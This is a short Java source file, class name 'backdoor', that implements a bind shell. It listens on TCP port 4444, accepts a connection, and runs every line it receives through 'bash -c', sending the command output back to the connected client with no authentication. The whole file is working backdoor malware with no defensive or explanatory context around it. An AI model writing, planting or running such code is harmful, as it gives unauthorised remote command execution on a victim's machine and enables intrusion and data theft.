import java.io.*;
import java.net.*;
import java.lang.*;

public class backdoor {

	public static void main(String[] args){
		try{

			int serverPort = 4444;
			ServerSocket serverSocket = new ServerSocket(serverPort);
			ProcessBuilder processBuilder = new ProcessBuilder();

			while(true){
				Socket clientSocket = serverSocket.accept();
				
				InputStreamReader isr = new InputStreamReader(clientSocket.getInputStream());
				BufferedReader in = new BufferedReader(isr);

				OutputStreamWriter osr = new OutputStreamWriter(clientSocket.getOutputStream());
				PrintWriter out = new PrintWriter(osr, true);

				while(true){
					out.print("> ");
					out.flush();
					String request = in.readLine();
					if(request.equals("quit"))
						break;

					processBuilder.command("bash", "-c", request);
					Process process = processBuilder.start();
					StringBuilder output = new StringBuilder();

					BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
					String line;
					while ((line = reader.readLine()) != null) {
						out.println(line);
					}
					process.waitFor();
					
				}
							
				in.close();
				out.close();
				clientSocket.close();
				break;
			}


		} catch(Exception e){
			e.printStackTrace();
		}
	}

}

